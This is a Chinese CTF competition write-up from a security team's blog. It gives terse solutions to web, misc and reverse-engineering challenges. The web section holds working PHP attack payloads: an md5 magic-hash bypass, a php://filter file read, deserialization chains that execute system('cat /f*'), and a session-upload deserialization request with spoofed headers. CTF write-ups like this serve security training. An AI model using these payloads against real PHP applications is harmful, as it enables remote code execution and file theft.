# 2022强国杯东部 初赛CTF-WriteUp

> 原文: https://www.ctfiot.com/63358.html
> ID: 63358

秀米社团

JOIN US ▶▶▶

招新

EDI安全的CTF战队经常参与各大CTF比赛，了解CTF赛事。

欢迎各位师傅加入EDI，大家一起打CTF，一起进步。

（诚招re crypto pwn misc方向的师傅）有意向的师傅请联系邮箱root@edisec.net、shiyi@edisec.net（带上自己的简历，简历内容包括但不限于就读学校、个人ID、擅长技术方向、历史参与比赛成绩等等。

点击蓝字 ·  关注我们

01

Web

1

md5_php

GET /?md5=0e215962017 HTTP/1.1Host: 39.106.153.217:
46975Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close

http://39.106.153.217:
46975/le.php?file=php://filter/convert.base64-encode/index/resource=flag

2

命令执行

https://www.xiaohongyan.cn/articles/2022/04/27/1651046661350.html

3

反序列化

<?php
class main{ protected $ClassObj;
 function __construct(){ $this->ClassObj = new evil();    }}// class easy{// function action(){// echo "hello Hacker";// }// }class evil{ private $file= 'system("cat /f*");'; function action(){ eval($this->file); }}$a = new main();echo urlencode(serialize($a));http://101.200.32.152:
16798/?a=O%3A4%3A%22main%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00file%22%3Bs%3A18%3A%22system%28%22cat+%2Ff%2A%22%29%3B%22%3B%7D%7D

4

phpti

<?phperror_reporting(0);highlight_string(file_get_contents('sessionti1.php'));class a{ public $uname; public $password; public function __construct($uname,$password){ $this->uname=$uname; $this->password=$password; } public function __wakeup(){ if($this->password==='admin') { highlight_string(file_get_contents('flag.php')); include('flag.php'); } else { echo 'hacker !!!'; } }}
function filter($string){ return str_replace('phpinfo()','phpinfo()up',$string);}
$uname=$_GET["admin"];$password=123456;$ser=filter(serialize(new a($uname,$password)));var_dump($ser);// $ser=filter(serialize(new a($uname,$password)));// $test=unserialize($ser);?>
<!-- O:1:"a":2:{s:5:"uname";s:1:"?";s:8:"password";s:5:"admin";} -->1=phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()";s:8:"password";s:5:"admin";}http://39.107.81.36:
45787/sessionti1.php?admin=phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()%22;s:8:%22password%22;s:5:%22admin%22;}https://www.jb51.net/article/241817.htmhttps://blog.csdn.net/bmth666/article/details/104737025

<form action="http://39.107.81.36:
45787/flag.php" method="POST" enctype="multipart/form-data">   </form>POST /flag.php HTTP/1.1Host: 39.107.81.36:
45787User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:83.1) Gecko/20100101 Firefox/83.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------169043664136240902353881690649Content-Length: 500Origin: nullConnection: closeCookie: PHPSESSID=ufikfl87kj719o80l9nfrhd2fqUpgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1-----------------------------169043664136240902353881690649Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"
123-----------------------------169043664136240902353881690649Content-Disposition: form-data; name="file"; filename="|O:5:"admin":1:{s:4:"root";s:36:"print_r(scandir(dirname(__FILE__)));";}"Content-Type: image/png塒NG

02

Misc

1

不要被迷惑

2

PCAP文件分析

3

平正开

dd = open('12.zip','wb')f1 = open('flag44c099db1.zip','rb')for l in f1.read(): if l == 0: dd.write(bytes([0x0])) else:        dd.write(bytes([0x100-l]))dd.close()

然后 http://www.hiencode.com/cvencode.html 解码

03

Re

1

re2

反编译exe后反编译pyc文件

分数达到1000就是flag

score = 0 后直接吐出flag

EDI安全

扫二维码｜关注我们

一个专注渗透实战经验分享的公众号


```
GET /?md5=0e215962017 HTTP/1.1Host: 39.106.153.217:
46975Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close
http://39.106.153.217:
46975/le.php?file=php://filter/convert.base64-encode/index/resource=flag
https://www.xiaohongyan.cn/articles/2022/04/27/1651046661350.html
<?php
class main{ protected $ClassObj;
 function __construct(){ $this->ClassObj = new evil();    }}// class easy{// function action(){// echo "hello Hacker";// }// }class evil{ private $file= 'system("cat /f*");'; function action(){ eval($this->file); }}$a = new main();echo urlencode(serialize($a));http://101.200.32.152:
16798/?a=O%3A4%3A%22main%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00file%22%3Bs%3A18%3A%22system%28%22cat+%2Ff%2A%22%29%3B%22%3B%7D%7D
<?phperror_reporting(0);highlight_string(file_get_contents('sessionti1.php'));class a{ public $uname; public $password; public function __construct($uname,$password){ $this->uname=$uname; $this->password=$password; } public function __wakeup(){ if($this->password==='admin') { highlight_string(file_get_contents('flag.php')); include('flag.php'); } else { echo 'hacker !!!'; } }}
function filter($string){ return str_replace('phpinfo()','phpinfo()up',$string);}
$uname=$_GET["admin"];$password=123456;$ser=filter(serialize(new a($uname,$password)));var_dump($ser);// $ser=filter(serialize(new a($uname,$password)));// $test=unserialize($ser);?>
<!-- O:1:"a":2:{s:5:"uname";s:1:"?";s:8:"password";s:5:"admin";} -->1=phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()";s:8:"password";s:5:"admin";}http://39.107.81.36:
45787/sessionti1.php?admin=phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()%22;s:8:%22password%22;s:5:%22admin%22;}https://www.jb51.net/article/241817.htmhttps://blog.csdn.net/bmth666/article/details/104737025
<form action="http://39.107.81.36:
45787/flag.php" method="POST" enctype="multipart/form-data">   </form>POST /flag.php HTTP/1.1Host: 39.107.81.36:
45787User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:83.1) Gecko/20100101 Firefox/83.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------169043664136240902353881690649Content-Length: 500Origin: nullConnection: closeCookie: PHPSESSID=ufikfl87kj719o80l9nfrhd2fqUpgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1-----------------------------169043664136240902353881690649Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"
123-----------------------------169043664136240902353881690649Content-Disposition: form-data; name="file"; filename="|O:5:"admin":1:{s:4:"root";s:36:"print_r(scandir(dirname(__FILE__)));";}"Content-Type: image/png塒NG
dd = open('12.zip','wb')f1 = open('flag44c099db1.zip','rb')for l in f1.read(): if l == 0: dd.write(bytes([0x0])) else:        dd.write(bytes([0x100-l]))dd.close()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/5-1665996607.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/7-1665996608.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/3-1665996609.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/2-1665996610.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/8-1665996610.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/5-1665996612.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/5-1665996612.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/2-1665996613.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/6-1665996614.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/10-1665996615.png)